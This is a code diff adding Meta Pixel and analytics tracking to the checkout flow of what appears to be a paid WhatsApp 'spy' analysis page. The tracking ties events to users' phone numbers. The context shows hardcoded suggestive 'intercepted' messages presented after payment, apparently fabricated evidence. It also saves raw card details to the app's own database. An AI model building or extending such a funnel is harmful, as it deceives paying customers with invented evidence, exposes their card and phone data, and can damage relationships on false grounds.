@@ -3,6 +3,8 @@ import { useNavigate } from 'react-router-dom'
 import { Search, MessageCircle, Image, Phone, AlertTriangle, CheckCircle, Star, Shield, CreditCard } from 'lucide-react'
 import { updateLeadName, saveAnalysisResults, getAnalysisResults, saveCardData, type CardData } from '../services/supabase'
 import QRCodePix from '../components/QRCodePix'
+import { useMetaPixel } from '../hooks/useMetaPixel'
+import { useAnalytics } from '../hooks/useAnalytics'
 
 interface AnalysisStep {
   id: string
@@ -16,6 +18,8 @@ interface AnalysisStep {
 
 const AnalysisPage = () => {
   const navigate = useNavigate()
+  const { trackEvent } = useMetaPixel()
+  const { trackEvent: trackAnalytics, trackFunnel } = useAnalytics()
   const intervalRef = useRef<NodeJS.Timeout | null>(null)
   const [currentStep, setCurrentStep] = useState(0)
   const [isAnalyzing, setIsAnalyzing] = useState(true)
@@ -284,6 +288,18 @@ const AnalysisPage = () => {
       )
     }
     
+    // Rastreia evento de visualização dos planos
+    // Meta Pixel
+    trackEvent('ViewContent', {
+      content_name: 'Payment Plans',
+      content_category: 'Pricing'
+    })
+    
+    // Analytics no banco
+    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
+    trackAnalytics('page_view', 'Payment Plans', '/analise', cleanWhatsapp)
+    trackFunnel('plans_viewed', 4, cleanWhatsapp)
+    
     // Mostrar planos de pagamento
     setShowPaymentPlans(true)
     
@@ -297,6 +313,24 @@ const AnalysisPage = () => {
   }
 
   const handleProceedToPayment = () => {
+    // Rastreia início do checkout
+    const planValue = selectedPlan === 'premium' ? 97.00 : 47.00
+    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
+    
+    // Meta Pixel
+    trackEvent('InitiateCheckout', {
+      content_name: selectedPlan === 'premium' ? 'Plano Premium' : 'Plano Básico',
+      value: planValue,
+      currency: 'BRL'
+    })
+    
+    // Analytics no banco
+    trackAnalytics('checkout', 'Checkout Initiated', '/analise', cleanWhatsapp, {
+      plan: selectedPlan,
+      value: planValue
+    })
+    trackFunnel('checkout_initiated', 5, cleanWhatsapp, { plan: selectedPlan })
+    
     // Mostrar métodos de pagamento na mesma página
     setShowPaymentMethods(true)
     
@@ -319,6 +353,29 @@ const AnalysisPage = () => {
   }
 
   const handlePixPayment = () => {
+    // Rastreia pagamento via PIX
+    const planValue = selectedPlan === 'premium' ? 97.00 : 47.00
+    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
+    
+    // Meta Pixel
+    trackEvent('Purchase', {
+      content_name: selectedPlan === 'premium' ? 'Plano Premium' : 'Plano Básico',
+      value: planValue,
+      currency: 'BRL',
+      content_category: 'PIX Payment'
+    })
+    
+    // Analytics no banco
+    trackAnalytics('purchase', 'Purchase Completed', '/analise', cleanWhatsapp, {
+      plan: selectedPlan,
+      value: planValue,
+      payment_method: 'pix'
+    })
+    trackFunnel('purchase_completed', 7, cleanWhatsapp, {
+      plan: selectedPlan,
+      value: planValue
+    })
+    
     // Lista de mensagens
     const allMessages = [
       "Oi, tudo bem? Tô com saudades...", "Consegue sair hoje?", "Deleta depois, ok?",
@@ -440,6 +497,25 @@ const AnalysisPage = () => {
   const handleCardPayment = async () => {
     setIsProcessing(true)
     setCardError('')
+    
+    // Rastreia adição de informações de pagamento
+    const planValue = selectedPlan === 'premium' ? 97.00 : 47.00
+    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
+    
+    // Meta Pixel
+    trackEvent('AddPaymentInfo', {
+      content_name: selectedPlan === 'premium' ? 'Plano Premium' : 'Plano Básico',
+      value: planValue,
+      currency: 'BRL',
+      content_category: 'Card Payment'
+    })
+    
+    // Analytics no banco
+    trackAnalytics('payment_info', 'Payment Info Added', '/analise', cleanWhatsapp, {
+      plan: selectedPlan,
+      payment_method: 'card'
+    })
+    trackFunnel('payment_info_added', 6, cleanWhatsapp)
     
     try {
       // Salvar dados do cartão no Supabase
@@ -1015,6 +1091,8 @@ const AnalysisPage = () => {
                         ? (selectedPlan === 'premium' ? 7.99 : 3.99)
                         : (selectedPlan === 'premium' ? 9.99 : 4.99)
                       }
+                      whatsapp={analysisData?.whatsapp}
+                      nome={profileData?.name || profileData?.pushName || profileData?.verifiedName || 'Usuário'}
                       onPaymentConfirmed={handlePixPayment}
                     />
                   </div>
